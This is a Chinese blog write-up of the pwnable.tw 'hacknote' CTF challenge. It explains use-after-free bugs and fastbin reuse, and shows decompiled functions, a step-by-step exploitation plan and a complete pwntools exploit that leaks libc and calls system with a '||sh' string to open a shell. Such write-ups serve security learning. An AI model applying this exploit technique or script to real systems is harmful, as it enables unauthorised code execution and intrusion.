<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong> </p>
<h2 id="例子-–-pwnable-tw-hacknote"><a href="#例子-–-pwnable-tw-hacknote" class="headerlink" title="例子 – pwnable.tw_hacknote"></a>例子 – pwnable.tw_hacknote</h2><p>题目在 <a href="../../files/libc&elf/hacknote">这里</a> 下载</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> root @ Kiprey <span class="hljs-keyword">in</span> ~/Desktop/Pwn [14:16:43]</span><br><span class="hljs-meta">$</span><span class="bash"> checksec hacknote</span>  <br>[*] &#x27;/root/Desktop/Pwn/hacknote&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure>

<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( dword_804A04C &lt;= <span class="hljs-number">5</span> )  <span class="hljs-comment">//最多放五个chunk</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) ) <span class="hljs-comment">//如果该位置为空, 猜测应该是一个数组, 元素是指向chunk的指针</span><br>      &#123;<br>        *(&amp;ptr + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>); <span class="hljs-comment">//malloc了八字节</span><br>        <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        *(_DWORD *)*(&amp;ptr + i) = sub_804862B; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = (<span class="hljs-keyword">int</span>)*(&amp;ptr + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-comment">//这里可以知道数组元素指向一个结构体, 这个结构体有两个指针</span><br>          <span class="hljs-comment">//第一个是函数sub_804862B的指针, 第二个是content指针,malloc出来的</span><br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *((<span class="hljs-keyword">void</span> **)*(&amp;ptr + i) + <span class="hljs-number">1</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++dword_804A04C;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sub_80487D4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)*(&amp;ptr + v1) + <span class="hljs-number">1</span>));<span class="hljs-comment">//先freecontent</span><br>    <span class="hljs-built_in">free</span>(*(&amp;ptr + v1));	<span class="hljs-comment">//再free chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>); <span class="hljs-comment">//并未设置NULL</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>    <span class="hljs-comment">//&amp;ptr + v1是函数指针的地址,解引用后得到改地址上的函数指针, 前面的是函数头</span><br>    <span class="hljs-comment">//就是调用存在改地址的put函数</span><br>    (*(<span class="hljs-keyword">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1)) (*(&amp;ptr + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
<li><p class="note note-info"><strong>UAF--use after free</strong>, 要在free后再次使用一般是在free后指针并未设置为NULL. 这是UAF一个很明显的标志</p> </li>
<li><p>这里的delete函数中就没有在free后面设置NULL, 我们可以利用fastbin链的特性，来使一个可修改的指针指向某个被释放的note的func成员指针，进而修改该指针并执行其指向的函数</p>
</li>
<li><p>过程分析:</p>
<ol>
<li>我们可以先声明两个note，分别称为note0、note1，注意这两个note的content size必须&gt;12， 这样content chunk<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="为了方便，我们将分配作为note的chunk称为note chunk
">[1]</span></a></sup>的大小就会 <strong>大于</strong> note chunk<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="与上条类似，我们同样将分配作为content的chunk称为content chunk
">[2]</span></a></sup>的大小</li>
</ol>
<pre><code>&gt; 此时content chunk的user size为(8+4)bytes, note chunk的user size为(申请的大小+4)
</code></pre>
<ol start="2">
<li>如此，当这两个note都被释放时，两个note的note chunk会放置进相同索引的fast bin链里，而另外两个content chunk则会放置进 <strong>另一个索引</strong> 的fast bin链里。 note chunk 和 content chunk 在fast bin链中互不干扰</li>
<li>第二步就是新建一个新的note2，注意该note的content size要&lt;=12分配到<strong>fastbin上note1</strong>的空间，成为note2的content chunk</li>
<li><strong>注意</strong>：当程序可以执行system函数时，注意传入的地址为note2的地址，所以<code>[system addr]</code> 以及其后4个字节都会被解释成字符串尝试执行。但[system addr]又必须保留，那该如何get shell呢？<br>这里有个小技巧，我们可以在最后四个字节构造<code>&quot;||sh&quot;</code>。这样便会执行<code>system(&quot;[system addr]||sh&quot;)</code><br>由于<code>[system addr]</code>肯定执行失败，所以便会执行到后面的<code>sh</code>。这样便可以get shell</li>
</ol>
</li>
</ul>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
<li><p>新建note0、note1，其note size必须大于12</p>
</li>
<li><p>释放note0、note1</p>
</li>
<li><p>新建note2，其note size必须小于12。</p>
<p>此时note2-&gt;content指针就会指向note1，在新建的过程中，便可修改内存上的内存。</p>
<ul>
<li>修改note1-&gt;func为<code>myPuts</code>函数（func指针默认设置的函数），</li>
<li>修改note1-&gt;content为<code>got@__libc_start_main</code>（随便哪个已经延迟绑定过的函数都行）</li>
</ul>
</li>
<li><p>输出note1的内容（print note1），从而泄露libc基地址，进而确定<code>system</code>函数的地址</p>
</li>
<li><p>释放note2并重新建立note2，其note size仍然必须&lt;=12</p>
<p>在建立note2过程中，修改以下内容</p>
<ul>
<li>修改note1-&gt;func为<code>system</code>函数</li>
<li>修改note1-&gt;content为<code>&quot;||sh&quot;</code>字符串</li>
</ul>
</li>
<li><p>输出note1的内容（print note1） 执行system(“sh”)， get shell！</p>
</li>
</ol>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>, <span class="hljs-number">10102</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br>context(terminal=[<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>], os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span>(<span class="hljs-params"><span class="hljs-built_in">len</span>, content</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Note size :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>))<br>    io.sendlineafter(<span class="hljs-string">&quot;Content :&quot;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># 新建note0和note1并删除，注意删除顺序</span><br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>delnote(<span class="hljs-number">1</span>)<br>delnote(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 新建note2，写入数据并执行</span><br>addnote(<span class="hljs-number">8</span>, flat(<span class="hljs-number">0x0804862B</span>, e.got[<span class="hljs-string">&#x27;read&#x27;</span>]))<br>printnote(<span class="hljs-number">1</span>)<br> <span class="hljs-comment"># 上一步泄露出了libc地址，处理得到system函数地址</span><br>libc_read_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;libc read addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_read_addr))<br><span class="hljs-comment"># 删除note2</span><br>delnote(<span class="hljs-number">2</span>)<br><br>libcbase_addr = libc_read_addr - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system_addr = libcbase_addr + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>log.success(<span class="hljs-string">&#x27;libcbase addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libcbase_addr))<br>log.success(<span class="hljs-string">&#x27;system addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># 重新建立note2，写入system地址和&#x27;||sh&#x27;字符串，执行函数</span><br>addnote(<span class="hljs-number">8</span>, flat(system_addr, <span class="hljs-string">&#x27;||sh&#x27;</span>)) <span class="hljs-comment"># 8或者12都是可以的</span><br><br>printnote(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># get shell！</span><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>为了方便，我们将分配作为note的chunk称为note chunk
<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>与上条类似，我们同样将分配作为content的chunk称为content chunk
<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/src-code/">src code</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/glibc-malloc/">glibc_malloc</a>
                    
                      <a class="hover-with-bg" href="/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">源码分析</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021-07/pwn-BUUOJ-writeup/">
                        <span class="hidden-mobile">BUUOJ_Writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
    <!-- cnzz Analytics Icon -->
    <span id="cnzz_stat_icon_1280126539" style="display: none"></span>
  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>









  <script  src="https://cdn.jsdelivr.net/npm/mermaid@8.10.1/dist/mermaid.min.js" ></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({"theme":"default"});
    }
  </script>




  

  

  

  

  

  
    <!-- cnzz Analytics -->
    <script defer src="//s4.cnzz.com/z_stat.php?id=1280126539&show=pic"
            type="text/javascript"></script>
  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
